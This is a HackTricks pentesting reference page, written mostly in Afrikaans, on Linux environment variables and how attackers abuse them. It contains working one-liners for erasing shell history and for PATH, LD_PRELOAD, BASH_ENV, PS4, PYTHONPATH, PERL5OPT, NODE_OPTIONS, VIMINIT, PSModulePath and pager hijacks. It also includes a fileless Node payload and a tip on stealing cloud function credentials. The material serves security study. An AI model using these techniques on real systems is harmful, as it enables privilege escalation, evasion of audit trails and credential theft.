# Linux-omgewingsveranderlikes

{{#include ../../banners/hacktricks-training.md}}

## Globale veranderlikes

Die globale veranderlikes **sal** deur **kindprosesse** geërf word.

Jy kan ’n globale veranderlike vir jou huidige sessie skep deur:
```bash
export MYGLOBAL="hello world"
echo $MYGLOBAL #Prints: hello world
```
Hierdie veranderlike sal toeganklik wees vir jou huidige sessies en hul kinderprosesse.

Jy kan ’n veranderlike **verwyder** deur:
```bash
unset MYGLOBAL
```
## Plaaslike veranderlikes

Die **plaaslike veranderlikes** kan slegs deur die **huidige shell/script** **toegang verkry** word.
```bash
LOCAL="my local"
echo $LOCAL
unset LOCAL
```
## Lys huidige veranderlikes
```bash
set
env
printenv
cat /proc/$$/environ
cat /proc/`python -c "import os; print(os.getppid())"`/environ
```
Die inhoud van `/proc/*/environ` word deur **NUL**-karakters geskei, dus is hierdie variante gewoonlik makliker om te lees:
```bash
tr '\0' '\n' </proc/$$/environ | sort -u
tr '\0' '\n' </proc/<PID>/environ | sort -u
```
As jy op soek is na **credentials** of **interessante dienskonfigurasie** binne geërfde omgewings, kyk ook na [Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md).

## Algemene veranderlikes

Van: [https://geek-university.com/linux/common-environment-variables/](https://geek-university.com/linux/common-environment-variables/).<sup>[[5]](#references)</sup>

- **DISPLAY** – die skerm wat deur **X** gebruik word. Hierdie veranderlike word gewoonlik op **:0.0** gestel, wat die eerste skerm op die huidige rekenaar beteken.
- **EDITOR** – die gebruiker se voorkeurteksredigeerder.
- **HISTFILESIZE** – die maksimum aantal reëls wat in die geskiedenislêer vervat kan wees.
- **HISTSIZE** – die aantal reëls wat by die geskiedenislêer gevoeg word wanneer die gebruiker sy sessie beëindig.
- **HOME** – jou tuisgids.
- **HOSTNAME** – die gasheernaam van die rekenaar.
- **LANG** – jou huidige taal.
- **MAIL** – die ligging van die gebruiker se posspool. Gewoonlik **/var/spool/mail/USER**.
- **MANPATH** – die lys gidse waarin daar vir handleidingbladsye gesoek word.
- **OSTYPE** – die tipe bedryfstelsel.
- **PS1** – die verstekprompt in bash.
- **PATH** – stoor die pad van al die gidse wat binêre lêers bevat wat jy wil uitvoer deur slegs die lêernaam te spesifiseer, en nie ’n relatiewe of absolute pad nie.
- **PWD** – die huidige werkgids.
- **SHELL** – die pad na die huidige opdragdop (byvoorbeeld **/bin/bash**).
- **TERM** – die huidige terminaaltipe (byvoorbeeld **xterm**).
- **TZ** – jou tydsone.
- **USER** – jou huidige gebruikersnaam.

## Interessante veranderlikes vir hacking

Nie elke veranderlike is ewe nuttig nie. Vanuit ’n offensiewe perspektief, prioritiseer veranderlikes wat **soekpaaie**, **opstartlêers**, **dinamiese linker-gedrag**, of **ouditering/aanmelding** verander.

### **HISTFILESIZE**

Verander die **waarde van hierdie veranderlike na 0**, sodat die **geskiedenislêer** (\~/.bash_history) wanneer jy jou **sessie beëindig**, tot **0 reëls** verkort word.
```bash
export HISTFILESIZE=0
```
### **HISTSIZE**

Verander die **waarde van hierdie veranderlike na 0**, sodat opdragte **nie in die geskiedenis in die geheue gehou word nie** en nie na die **geskiedenislêer** (\~/.bash_history) geskryf sal word nie.
```bash
export HISTSIZE=0
```
### **HISTCONTROL**

As die **waarde van hierdie veranderlike op `ignorespace` of `ignoreboth` gestel is**, sal enige opdrag waaraan ’n ekstra spasie voorafgaan, nie in die history gestoor word nie.
```bash
export HISTCONTROL=ignorespace
```

```bash
$ echo "to save or"
$  echo "not to save"
```
### **HISTFILE**

Wys die **history file** na **`/dev/null`** of unset dit heeltemal. Dit is gewoonlik meer betroubaar as om slegs die history size te verander.
```bash
export HISTFILE=/dev/null
unset HISTFILE
```
### http_proxy & https_proxy

Die prosesse sal die **proxy** wat hier gespesifiseer word, gebruik om deur **http of https** aan die internet te koppel.
```bash
export http_proxy="http://10.10.10.10:8080"
export https_proxy="http://10.10.10.10:8080"
```
### all_proxy & no_proxy

- `all_proxy`: verstek-proxy vir tools/protokolle wat dit eerbiedig.
- `no_proxy`: bypass-lys (gashere/domains/CIDR's) wat direk moet verbind.
```bash
export all_proxy="socks5h://10.10.10.10:1080"
export no_proxy="localhost,127.0.0.1,.corp.local,10.0.0.0/8"
```
Beide klein- en hooflettervariante kan gebruik word, afhangend van die tool (`http_proxy`/`HTTP_PROXY`, `no_proxy`/`NO_PROXY`).

### SSL_CERT_FILE & SSL_CERT_DIR

Die prosesse sal die sertifikate vertrou wat in **hierdie omgewingsveranderlikes** aangedui word. Dit is nuttig om tools soos **`curl`**, **`git`**, Python HTTP-kliënte of pakketbestuurders ’n CA te laat vertrou wat deur die aanvaller beheer word (byvoorbeeld om ’n interception proxy wettig te laat lyk).
```bash
export SSL_CERT_FILE=/path/to/ca-bundle.pem
export SSL_CERT_DIR=/path/to/ca-certificates
```
### **PATH**

Indien ’n privileged wrapper/script commands **sonder absolute paths** uitvoer, wen die **eerste attacker-controlled directory** in `PATH`. Dit is die primitive agter baie **PATH hijacks** in `sudo`, cron jobs, shell wrappers en custom SUID helpers. Soek na `env_keep+=PATH`, swak `secure_path`, of wrappers wat `tar`, `service`, `cp`, `python`, ens. volgens naam aanroep.
```bash
mkdir -p /dev/shm/bin
cat > /dev/shm/bin/tar <<'EOF'
#!/bin/sh
echo '[+] PATH hijack reached' >&2
id
EOF
chmod +x /dev/shm/bin/tar
PATH=/dev/shm/bin:$PATH vulnerable-wrapper
```
Vir volledige privilege-escalation-kettings wat `PATH` misbruik, kyk na [Linux Privilege Escalation](linux-privilege-escalation/README.md).

### **HOME & XDG_CONFIG_HOME**

`HOME` is nie net ’n gidsverwysing nie: baie tools laai outomaties **dotfiles**, **plugins** en **per-user configuration** vanaf `$HOME` of `$XDG_CONFIG_HOME`. Indien ’n bevoorregte workflow hierdie waardes behou, kan **config injection** makliker wees as binary hijacking.
```bash
export HOME=/dev/shm/fakehome
export XDG_CONFIG_HOME=/dev/shm/fakehome/.config
mkdir -p "$XDG_CONFIG_HOME"
```
Interessante teikens sluit `.gitconfig`, `.wgetrc`, `.curlrc`, `.inputrc`, `.pythonrc.py` en tool-spesifieke lêers soos `.terraformrc` in.

### **LD_PRELOAD, LD_LIBRARY_PATH & LD_AUDIT**

Hierdie veranderlikes beïnvloed die **dynamic linker**:

- `LD_PRELOAD`: dwing ekstra shared objects om eerste gelaai te word.
- `LD_LIBRARY_PATH`: voeg biblioteek-soekgidse vooraan by.
- `LD_AUDIT`: laai auditor-biblioteke wat biblioteeklaai en simboolresolusie monitor.

Hulle is uiters waardevol vir **hooking**, **instrumentation** en **privilege escalation** indien ’n bevoorregte opdrag hulle behou. In **secure-execution**-modus (`AT_SECURE`, byvoorbeeld setuid/setgid/capabilities) verwyder of beperk die loader baie van hierdie veranderlikes. Parser-foute in daardie vroeë loader-stadium het egter steeds ’n groot impak, omdat hulle **voor** die teikenprogram uitgevoer word.<sup>[[2]](#references)</sup>
```bash
env | grep -E '^LD_'
ldso=$(ls /lib64/ld-linux-*.so.* /lib/*-linux-gnu/ld-linux-*.so.* 2>/dev/null | head -n1)
"$ldso" --list-diagnostics /bin/true | head
"$ldso" --list-tunables /bin/true | head
```
### **GLIBC_TUNABLES**

`GLIBC_TUNABLES` verander vroeë glibc-gedrag (byvoorbeeld allocator tunables) en is baie handig in exploit-laboratoriums. Dit is ook vanuit ’n sekuriteitsperspektief belangrik omdat die **dynamic loader dit baie vroeg parse**. Die 2023 **Looney Tunables**-bug was ’n goeie herinnering dat ’n enkele environment variable wat deur die loader geparse word, ’n **local privilege-escalation primitive** teen SUID-programme kan word.<sup>[[6]](#references)</sup>
```bash
GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./binary
```
### **BASH_ENV & ENV**

As **Bash** **nie-interaktief** begin, kontroleer dit `BASH_ENV` en sourceer daardie lêer voordat dit die teikenscript uitvoer. Wanneer Bash as `sh` aangeroep word, of in POSIX-styl interaktiewe modus, kan `ENV` ook geraadpleeg word. Dit is ’n klassieke manier om ’n shell-wrapper in code execution te verander indien die omgewing deur ’n aanvaller beheer word.
```bash
cat > /tmp/pre.sh <<'EOF'
echo '[+] sourced before the target script'
EOF
BASH_ENV=/tmp/pre.sh bash -c 'echo target'
```
Bash ignoreer hierdie opstartlêers wanneer die **werklike/effektiewe ID's verskil**; `-p` behou die effektiewe ID, maar aktiveer nie daardie opstartlêers nie, dus hang die presiese gedrag af van hoe die wrapper die shell begin. Wees versigtig met bevoorregte wrappers wat `setuid()`/`setgid()` **voor** die begin van Bash uitvoer: sodra die ID's weer ooreenstem, kan Bash `BASH_ENV`, `ENV` en verwante shell-toestand vertrou wat andersins geïgnoreer sou word.<sup>[[1]](#references)</sup>

### **PS4 + SHELLOPTS (xtrace)**

Wanneer Bash met **xtrace** geaktiveer loop, brei dit `PS4` uit en druk dit voor elke getraceerde command. `PS4` word soos 'n prompt uitgebrei, dus word 'n **command substitution** daarin uitgevoer. Belangrik, xtrace self kan uitsluitlik vanuit die omgewing aangeskakel word deur `SHELLOPTS=xtrace` uit te voer — geen `-x` op die command line is nodig nie — dus word enige Bash-script wat die slagoffer uitvoer, kode-uitvoering.<sup>[[7]](#references)</sup>
```bash
echo 'echo target' > /tmp/victim.sh

# Pure environment-variable injection (no -x flag)
SHELLOPTS=xtrace PS4='$(id > /tmp/ps4-executed)' bash /tmp/victim.sh
cat /tmp/ps4-executed

# Same primitive when a job is run with debugging enabled
PS4='$(touch /tmp/ps4-x)' bash -x /tmp/victim.sh
```
`PS4` doen niks totdat xtrace aktief is (`SHELLOPTS=xtrace`, `set -x` of `bash -x`), en Bash verwyder `SHELLOPTS` in bevoorregte/setuid-kontekste net soos `BASH_ENV`.

### **PYTHONPATH, PYTHONHOME, PYTHONSTARTUP, PYTHONINSPECT & PYTHONBREAKPOINT**

Hierdie veranderlikes verander hoe Python begin:

- `PYTHONPATH`: voeg import-soekpaaie vooraan.
- `PYTHONHOME`: verskuif die standaardbiblioteekboom.
- `PYTHONSTARTUP`: voer ’n lêer uit voordat die interaktiewe prompt verskyn.
- `PYTHONINSPECT=1`: skakel oor na interaktiewe modus nadat ’n script voltooi is.
- `PYTHONBREAKPOINT`: `package.module.callable` wat aangeroep word (en waarvan die module ingevoer word) wanneer die kode `breakpoint()` bereik.<sup>[[8]](#references)</sup>

Hulle is nuttig teen maintenance scripts, debuggers, shells en wrappers wat Python met ’n beheerbare omgewing aanroep. `python -E` en `python -I` ignoreer alle `PYTHON*`-veranderlikes.
```bash
mkdir -p /tmp/pylib
printf 'print("owned from PYTHONPATH")\n' > /tmp/pylib/htmod.py
PYTHONPATH=/tmp/pylib python3 -c 'import htmod'
PYTHONPATH=/tmp/pylib python3 -I -c 'import htmod'   # ignored in isolated mode

# PYTHONBREAKPOINT: runs when the target reaches breakpoint()
printf 'import sys\nbreakpoint(*sys.argv[1:])\n' > /tmp/bp.py
PYTHONBREAKPOINT='os.system' python3 /tmp/bp.py 'id'   # requires the code to hit breakpoint()
```
'n Onlangse voorbeeld uit die werklike wêreld was die 2024 **needrestart** LPE op Ubuntu/Debian-stelsels: die root-owned scanner het 'n onbevoorregte proses se `PYTHONPATH` vanaf `/proc/<PID>/environ` gekopieer en daarna Python uitgevoer. Die gepubliseerde exploit het `importlib/__init__.so` in die aanvaller-beheerde pad geplaas, sodat Python aanvallerkode tydens sy eie initialisering uitgevoer het, voordat die helper se hard-coded script selfs saak gemaak het.<sup>[[3]](#references)</sup>

### **PERL5OPT & PERL5LIB**

Perl het soortgelyke nuttige startup-variabeles:

- `PERL5LIB`: voeg library-gidse vooraan.
- `PERL5OPT`: inject switches asof hulle op elke `perl`-command line was.

Dit kan **automatic module loading** afdwing of interpreter-gedrag verander voordat die target script enigiets interessants doen. Perl ignoreer hierdie variabeles in **taint / setuid / setgid**-kontekste, maar hulle is steeds baie belangrik vir normale root-run wrappers, CI-jobs, installers en custom sudoers-reëls.
```bash
mkdir -p /tmp/perllib
cat > /tmp/perllib/HT.pm <<'EOF'
package HT;
BEGIN { print "PERL5OPT_TRIGGERED\n" }
1;
EOF
PERL5LIB=/tmp/perllib PERL5OPT=-MHT perl -e 'print "target\n"'
```
### **NODE_OPTIONS**

`NODE_OPTIONS` voeg **Node.js CLI flags** vooraf by elke `node`-proses wat die environment erf. Dit maak dit nuttig teen wrappers, CI jobs, Electron helpers en sudo-reëls wat uiteindelik Node aanroep. Die interessantste flags vanuit ’n offensiewe oogpunt is gewoonlik:

- `--require <file>`: laai ’n CommonJS-lêer vooraf voordat die teikenskrip uitgevoer word.
- `--import <module>`: laai ’n ES-module vooraf voordat die teikenskrip uitgevoer word.

Node verwerp sommige gevaarlike flags in `NODE_OPTIONS`, maar `--require` en `--import` word uitdruklik toegelaat en word **voor** die gewone command-line-argumente verwerk.<sup>[[4]](#references)</sup>
```bash
cat > /tmp/preload.js <<'EOF'
console.error('[+] NODE_OPTIONS preload reached')
EOF
NODE_OPTIONS='--require /tmp/preload.js' node -e 'console.log("target")'
```
#### Lêerlose preload met ’n `data:` URL

Wanneer jy `NODE_OPTIONS` kan stel maar **nie ’n lêer** op die target kan skryf nie (lêerstelsel met slegs-leestoegang, beperkte API, serverless runtime, ens.), aanvaar `--import` ’n `data:text/javascript,` URL, sodat die hele payload binne die omgewingsveranderlike self vervoer word. Die JavaScript moet **volledig URL-encoded** wees — Node ontleed die waarde as ’n URL, dus verkort enige rou spasie (of ander ongeënkodeerde karakter) die payload en veroorsaak dit ’n `SyntaxError`. Dit werk op Node 20.6+ waar `--import` op die `NODE_OPTIONS`-allowlist is.<sup>[[4]](#references)</sup>
```bash
# fileless proof of execution (note: no raw spaces in the data URL)
NODE_OPTIONS='--import data:text/javascript,console.log(%22fileless_preload%22)' node -e 'console.log("target")'

# Real payload, URL-encoded (run a command / exfiltrate env vars)
PAYLOAD=$(python3 - <<'PY'
import urllib.parse
js = "import('child_process').then(cp=>console.log(cp.execSync('id').toString()))"
print("--import data:text/javascript," + urllib.parse.quote(js, safe=""))
PY
)
NODE_OPTIONS="$PAYLOAD" node -e 'console.log("target")'
```
> [!TIP]
> Dit is ’n algemene manier om `NODE_OPTIONS`-beheer in RCE om te skakel op **bestuurde cloud runtimes** waarvan die funksies Node uitvoer. Byvoorbeeld, ’n aanvaller wat slegs ’n Lambda se konfigurasie kan verander (`lambda:UpdateFunctionConfiguration`, geen `iam:PassRole` of kode-opdatering nie), kan `NODE_OPTIONS=--import data:text/javascript,<payload>` inspuit om kode binne die funksie uit te voer en die geloofsbriewe van sy execution role te steel. Die ingespuite module loop **voor** die handler, wat daarna steeds normaal uitgevoer word.

Vir afgeleë gadget chains wat `NODE_OPTIONS` indirek stel (byvoorbeeld prototype-pollution na RCE), kyk na [hierdie ander bladsy](../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.md).

### **RUBYLIB & RUBYOPT**

Ruby bied dieselfde soort startup abuse:

- `RUBYLIB`: voeg gidse vooraan Ruby se load path.
- `RUBYOPT`: spuit command-line options soos `-r` in by elke `ruby`-aanroep.
```bash
mkdir -p /tmp/rubylib
printf 'warn "[+] RUBYOPT preload reached"\n' > /tmp/rubylib/ht.rb
RUBYLIB=/tmp/rubylib RUBYOPT='-rht' ruby -e 'puts :target'
```
Die 2024 **needrestart**-kwesbaarhede het gewys dat dit nie net ’n laboratoriumtruuk is nie: dieselfde root-owned helper wat kwesbaar was vir `PYTHONPATH`-misbruik, kon ook gedwing word om Ruby met ’n aanvaller-beheerde `RUBYLIB` uit te voer, waardeur `enc/encdb.so` uit ’n aanvallergids gelaai is.<sup>[[3]](#references)</sup>

### **VIMINIT & EXINIT**

Vim/Neovim voer die Ex-opdragte uit wat in `VIMINIT` (of die `EXINIT`-terugvalopsie daarvan) vervat is tydens ’n normale opstart. Ex-opdragte sluit `:!cmd` en `:call system(...)` in, dus lei beheer oor die veranderlike tot code execution wanneer ’n slagoffer Vim oopmaak (`sudo vim` as root, `crontab -e`, `visudo`, `git`/`less` wat `$EDITOR` begin, ens.).<sup>[[9]](#references)</sup>
```bash
echo hi > /tmp/victim.txt
printf ':qa!\n' | VIMINIT='silent! !touch /tmp/vim-executed' vim /tmp/victim.txt
test -e /tmp/vim-executed && echo 'VIMINIT executed'
```
Batch mode (`vim -es`/`-Es`) slaan hierdie veranderlikes oor, maar 'n normale interaktiewe opstart voer dit uit.

### **PowerShell (pwsh): PSModulePath, DOTNET_STARTUP_HOOKS & CLR profiler**

PowerShell Core (`pwsh`) loop op Linux/macOS (en Windows) en is 'n **.NET-toepassing**, dus laat verskeie omgewingsveranderlikes enige `pwsh`-aanroeping met 'n oorgeërfde omgewing code execution toe — nuttig teen cron/systemd-jobs, CI-runners en bevoorregte wrappers wat `pwsh` aanroep.

- `PSModulePath`: PowerShell soek rekursief in elke gids in hierdie lys vir `.psd1`/`.psm1`-modules en **auto-loads** een wanneer daar vir die eerste keer na 'n opdrag wat dit uitvoer, verwys word. Voeg 'n gids vooraan, en jou module se topvlak-code loop tydens import; omdat resolusie *Alias → Function → Cmdlet* is, kan 'n uitgevoerde funksie selfs 'n ingeboude cmdlet wat die slagoffer aanroep, oorskadu.<sup>[[10]](#references)</sup>
- `XDG_CONFIG_HOME`: verskuif `powershell/Microsoft.PowerShell_profile.ps1`, wat tydens opstart uitgevoer word (tensy `-NoProfile` gebruik word).
- `DOTNET_STARTUP_HOOKS`: managed assembly waarvan `StartupHook.Initialize()` voor `Main` loop (gedeel deur elke .NET-toepassing).
- `CORECLR_ENABLE_PROFILING=1` + `CORECLR_PROFILER={guid}` + `CORECLR_PROFILER_PATH=/path/evil.so`: die CLR profiling API laai 'n aanvaller-biblioteek tydens opstart in die proses (path-veranderlikes het voorkeur bo die registry; `DOTNET_*` is die nuwer alias). Op Windows PowerShell 5.1 (.NET Framework), gebruik `COR_ENABLE_PROFILING`/`COR_PROFILER`/`COR_PROFILER_PATH`. MITRE ATT&CK T1574.012.<sup>[[11]](#references)</sup>
```bash
# PSModulePath module auto-load hijack
mkdir -p /tmp/evil/Hijack
printf 'New-Item -ItemType File /tmp/ps-mod-exec -Force|Out-Null\nfunction Invoke-Report{}\nExport-ModuleMember -Function Invoke-Report\n' > /tmp/evil/Hijack/Hijack.psm1
printf "@{ModuleVersion='1.0';RootModule='Hijack.psm1';FunctionsToExport=@('Invoke-Report')}\n" > /tmp/evil/Hijack/Hijack.psd1
PSModulePath="/tmp/evil:$PSModulePath" pwsh -Command 'Invoke-Report'
test -e /tmp/ps-mod-exec && echo 'PSModulePath auto-load executed'
```
Op Windows verwyder `PSExecutionPolicyPreference=Bypass` ook die "unsigned scripts blocked"-beveiligingsversperring, sodat 'n geplante profile/module werklik uitgevoer word. Sien die toegewyde bladsy vir volledige PoCs:

{{#ref}}
../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-powershell-applications-injection.md
{{#endref}}

### **PAGER, MANPAGER, GIT_PAGER, GIT_EDITOR & LESSOPEN**

Sommige tools lees nie bloot 'n path uit die environment nie; hulle gee die waarde aan 'n **shell**, 'n **editor** of 'n **input preprocessor** deur. Dit maak die volgende variables besonder interessant wanneer 'n privileged wrapper `git`, `man`, `less` of soortgelyke text viewers uitvoer:

- `PAGER`, `MANPAGER`, `GIT_PAGER`: kies die pager command.
- `GIT_EDITOR`, `VISUAL`, `EDITOR`: kies die editor command, dikwels met arguments.
- `LESSOPEN`, `LESSCLOSE`: definieer pre/post-processors wat uitgevoer word wanneer `less` 'n file oopmaak.
```bash
PAGER='sh -c "exec sh 0<&1 1>&1"' man man

cat > /tmp/lesspipe.sh <<'EOF'
#!/bin/sh
echo '[+] LESSOPEN triggered' >&2
cat "$1"
EOF
chmod +x /tmp/lesspipe.sh
LESSOPEN='|/tmp/lesspipe.sh %s' less /etc/hosts
```
Git ondersteun ook **env-only config injection** sonder om die skyf aan te raak via `GIT_CONFIG_COUNT`, `GIT_CONFIG_KEY_<n>` en `GIT_CONFIG_VALUE_<n>`:
```bash
GIT_CONFIG_COUNT=1 \
GIT_CONFIG_KEY_0=core.pager \
GIT_CONFIG_VALUE_0='sh -c "exec sh 0<&1 1>&1"' \
git -p help
```
Vanuit ’n post-exploitation-perspektief, onthou ook dat geërfde omgewings dikwels **credentials**, **proxy settings**, **service tokens** of **cloud keys** bevat. Kyk na [Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md) vir `/proc/<PID>/environ` en `systemd` `Environment=` hunting.

### PS1

Verander hoe jou prompt lyk.

[**Dit is ’n voorbeeld**](https://gist.github.com/carlospolop/43f7cd50f3deea972439af3222b68808)

Root:

![PERL5OPT & PERL5LIB - PS1: Dit is ’n voorbeeld](<../images/image (897).png>)

Gereelde gebruiker:

![PERL5OPT & PERL5LIB - PS1: Een, twee en drie take in die agtergrond](<../images/image (740).png>)

Een, twee en drie take in die agtergrond:

![PERL5OPT & PERL5LIB - PS1: Een, twee en drie take in die agtergrond](<../images/image (145).png>)

Een agtergrondtaak, een gestopte taak, en die laaste command het nie korrek voltooi nie:

![PERL5OPT & PERL5LIB - PS1: Een agtergrondtaak, een gestopte taak, en die laaste command het nie korrek voltooi nie](<../images/image (715).png>)

## References

- [1] [GNU Bash Manual - Bash-opstartlêers](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html)
- [2] [ld.so(8) - Linux-manbladsy](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [3] [Qualys - LPEs in needrestart](https://www.qualys.com/2024/11/19/needrestart/needrestart.txt)
- [4] [Node.js CLI-dokumentasie - `NODE_OPTIONS`](https://nodejs.org/api/cli.html)
- [5] [Algemene omgewingsveranderlikes - Geek University](https://geek-university.com/linux/common-environment-variables/)
- [6] [CVE-2023-4911: Looney Tunables - Local Privilege Escalation in the glibc se ld.so - Qualys](https://blog.qualys.com/vulnerabilities-threat-research/2023/10/03/cve-2023-4911-looney-tunables-local-privilege-escalation-in-the-glibcs-ld-so)
- [7] [GNU Bash Manual - Bash-veranderlikes (`PS4`) & Die Set Builtin (`xtrace`/`SHELLOPTS`)](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
- [8] [PEP 553 - Ingeboude breakpoint() en PYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
- [9] [Vim-dokumentasie - starting.txt (`VIMINIT`, `EXINIT`)](https://vimhelp.org/starting.txt.html#initialization)
- [10] [about_PSModulePath & PowerShell-module-outomatiese laai](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_psmodulepath)
- [11] [.NET-ontfoutings- & profileringskonfigurasie-instellings (`CORECLR_`/`DOTNET_`/`COR_` profiler variables)](https://learn.microsoft.com/en-us/dotnet/core/runtime-config/debugging-profiling)
{{#include ../../banners/hacktricks-training.md}}
